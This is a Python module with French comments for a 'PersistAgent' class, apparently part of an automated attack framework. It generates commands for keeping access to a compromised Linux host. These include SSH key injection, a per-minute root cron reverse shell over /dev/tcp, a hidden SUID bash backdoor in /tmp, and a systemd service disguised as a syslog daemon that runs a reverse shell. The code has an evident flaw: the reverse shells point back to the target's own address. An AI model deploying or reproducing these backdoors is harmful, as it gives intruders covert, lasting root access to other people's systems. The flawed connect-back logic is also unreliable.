"""
PersistAgent — Mise en place de persistance.

Rôle dans la kill chain :
    Après l'accès initial et l'élévation de privilèges, l'agent de persistance
    génère les commandes et configurations nécessaires pour maintenir l'accès
    à la cible. Il propose 4 méthodes de persistance couvrant différentes
    techniques ATT&CK.

Tactiques/Techniques couvertes :
    TA0003 Persistence — T1098 Account Manipulation (SSH Authorized Keys)
    TA0003 Persistence — T1053.003 Scheduled Task/Job: Cron (Reverse Shell)
    TA0003 Persistence — T1548.001 Abuse Elevation Control: SUID Backdoor
    TA0003 Persistence — T1543.002 Create/Modify System Process: Systemd Service

Méthodes de persistance générées :
    1. SSH key injection (T1098.004)  — Ajout d'une clé publique RSA 4096
    2. Cron reverse shell (T1053.003) — Shell inversé chaque minute
    3. SUID bash backdoor (T1548.001) — Copie de /bin/bash avec bit SUID
    4. Systemd service (T1543.002)    — Service systemd avec reverse shell
"""

import subprocess
import os


class PersistAgent:
    def __init__(self, target: str, context: dict = None):
        """
        Initialise l'agent de persistance.

        Args:
            target (str): Adresse IP ou nom d'hôte de la cible.
            context (dict, optional): Contexte cumulatif du superviseur
                                      (recon, exploit, privesc).
        """
        self.target = target
        self.context = context or {}

    def generate_ssh_key(self) -> dict:
        """
        Génère une paire de clés SSH RSA 4096 et retourne la clé publique.

        La clé privée est sauvegardée localement dans ~/.ssh/id_rsa_killchain.
        La commande ssh-keygen utilise les flags :
            -t rsa    : Type de clé RSA.
            -b 4096   : Taille de 4096 bits (sécurité élevée).
            -f <path> : Chemin du fichier de clé privée.
            -N ""     : Pas de passphrase (accès sans mot de passe).
            -q        : Mode quiet.

        Si la clé existe déjà, elle est réutilisée sans regénération.

        Returns:
            dict: Résultat contenant :
                  - technique (str) : T1098.004 (SSH Authorized Keys).
                  - name (str) : Nom descriptif de la méthode.
                  - pubkey (str) : Clé publique SSH complète.
                  - command (str) : Commande à exécuter sur la cible
                    pour ajouter la clé aux authorized_keys.
        """
        try:
            # Chemin de la clé privée dans le home de l'attaquant
            key_path = os.path.expanduser("~/.ssh/id_rsa_killchain")
            # Génération uniquement si la clé n'existe pas déjà
            if not os.path.exists(key_path):
                subprocess.run(
                    ["ssh-keygen", "-t", "rsa", "-b", "4096",
                     "-f", key_path, "-N", "", "-q"],
                    capture_output=True, timeout=30
                )
            # Lecture de la clé publique (.pub) générée
            with open(f"{key_path}.pub") as f:
                pubkey = f.read().strip()
            return {
                "technique": "T1098.004",
                "name": "SSH Authorized Keys",
                "pubkey": pubkey,
                # Commande d'injection dans authorized_keys :
                # echo ajoute la clé, chmod 600 restreint les permissions
                "command": f"echo '{pubkey}' >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys",
            }
        except Exception as e:
            return {
                "technique": "T1098.004",
                "name": "SSH Authorized Keys",
                "status": "skipped",
                "error": str(e),
                # Commande alternative à exécuter manuellement
                "command": "ssh-keygen -t rsa -b 4096 -f ~/.ssh/id_rsa_killchain -N ''",
            }

    def generate_cron(self) -> dict:
        """
        Génère une commande cron pour un reverse shell chaque minute.

        Le cron utilise la syntaxe :
            * * * * * : Toutes les minutes de chaque heure/jour/mois.
            root      : Exécution en tant que root.
            /bin/bash -c : Lance un shell bash avec la commande.
            bash -i >& /dev/tcp/{IP}/{PORT} 0>&1 : Shell interactif
                redirigé vers une socket TCP (reverse shell).

        Returns:
            dict: Résultat contenant :
                  - technique (str) : T1053.003 (Cron).
                  - name (str) : Nom descriptif.
                  - command (str) : Ligne cron à ajouter dans /etc/crontab.
                  - description (str) : Description textuelle.
                  - detection_note (str) : Note de détection pour le Blue Team.
        """
        # Commande cron : reverse shell bash toutes les minutes
        # >& /dev/tcp/{host}/{port} : redirige stdin/stdout vers une socket TCP
        # 0>&1 : redirige stderr vers stdout (tout passe par la socket)
        cmd = f"echo '* * * * * root /bin/bash -c \"bash -i >& /dev/tcp/{self.target}/5555 0>&1\"' >> /etc/crontab"
        return {
            "technique": "T1053.003",
            "name": "Cron Job Reverse Shell",
            "command": cmd,
            "description": "Reverse shell every minute via crontab",
            # Indicateurs de compromission pour la détection
            "detection_note": "Check /etc/crontab and /var/log/syslog for anomalies",
        }

    def generate_suid_backdoor(self) -> dict:
        """
        Génère les commandes pour créer un binaire SUID backdoor.

        Principe :
            cp /bin/bash /tmp/.bash  : Copie bash dans /tmp (nom caché avec .).
            chmod 4755 /tmp/.bash    : Ajoute le bit SUID (4) + rwxr-xr-x (755).
            /tmp/.bash -p            : Exécution avec privilèges préservés (-p).

        Returns:
            dict: Résultat contenant :
                  - technique (str) : T1548.001 (SUID).
                  - name (str) : Nom descriptif.
                  - command (str) : Commandes de mise en place.
                  - usage (str) : Commande d'utilisation de la backdoor.
                  - cleanup (str) : Commande de nettoyage.
        """
        return {
            "technique": "T1548.001",
            "name": "SUID Binary Backdoor",
            # chmod 4755 : 4=SUID, 7=rwx propriétaire, 5=r-x groupe, 5=r-x autres
            "command": "cp /bin/bash /tmp/.bash && chmod 4755 /tmp/.bash",
            # -p : préserve les privilèges effectifs (ignore le drop d'euid)
            "usage": "/tmp/.bash -p",
            "cleanup": "rm -f /tmp/.bash",
        }

    def generate_systemd_service(self) -> dict:
        """
        Génère un fichier d'unité systemd pour un service de persistance.

        Le service système imite un service légitime (System Log Service)
        mais exécute en réalité un reverse shell bash au démarrage.

        Structure du fichier .service :
            [Unit]       : Métadonnées du service.
            [Service]    : Commande à exécuter et politique de redémarrage.
                ExecStart : Reverse shell bash vers la cible sur le port 5555.
                Restart=always : Redémarrage automatique en cas de crash.
            [Install]    : Cible d'activation (multi-user.target = runlevel 3).

        Returns:
            dict: Résultat contenant :
                  - technique (str) : T1543.002 (Systemd Service).
                  - name (str) : Nom descriptif.
                  - unit_name (str) : Nom du fichier .service.
                  - unit_content (str) : Contenu complet du fichier d'unité.
                  - commands (list) : Liste des commandes à exécuter pour
                    installer, activer et démarrer le service.
        """
        # Construction du fichier d'unité systemd
        unit = (
            f"[Unit]\n"
            f"Description=System Log Service\n\n"   # Description trompeuse
            f"[Service]\n"
            f"ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/{self.target}/5555 0>&1'\n"
            f"Restart=always\n\n"                    # Redémarrage automatique
            f"[Install]\n"
            f"WantedBy=multi-user.target\n"          # Activé au runlevel multi-utilisateur
        )
        return {
            "technique": "T1543.002",
            "name": "Systemd Service",
            "unit_name": "syslogd.service",          # Nom模仿 syslog légitime
            "unit_content": unit,
            "commands": [
                # Écriture du fichier d'unité dans /etc/systemd/system/
                f"cat > /etc/systemd/system/syslogd.service << 'EOF'\n{unit}EOF",
                # Rechargement de la configuration systemd
                "systemctl daemon-reload",
                # Activation au démarrage du système
                "systemctl enable syslogd.service",
                # Démarrage immédiat du service
                "systemctl start syslogd.service",
            ],
        }

    def run(self) -> dict:
        """
        Point d'entrée principal de l'agent de persistance.

        Génère les 4 méthodes de persistance et les retourne sous forme
        de liste structurée prête à être consommée par l'agent rapport.

        Returns:
            dict: Résultat contenant :
                  - technique (str) : T1098 (technique parente).
                  - tactic (str) : TA0003.
                  - target (str) : Cible de la mission.
                  - persistence_methods (list) : Liste des 4 méthodes générées.
        """
        return {
            "technique": "T1098",
            "tactic": "TA0003",
            "target": self.target,
            "persistence_methods": [
                self.generate_ssh_key(),
                self.generate_cron(),
                self.generate_suid_backdoor(),
                self.generate_systemd_service(),
            ],
        }
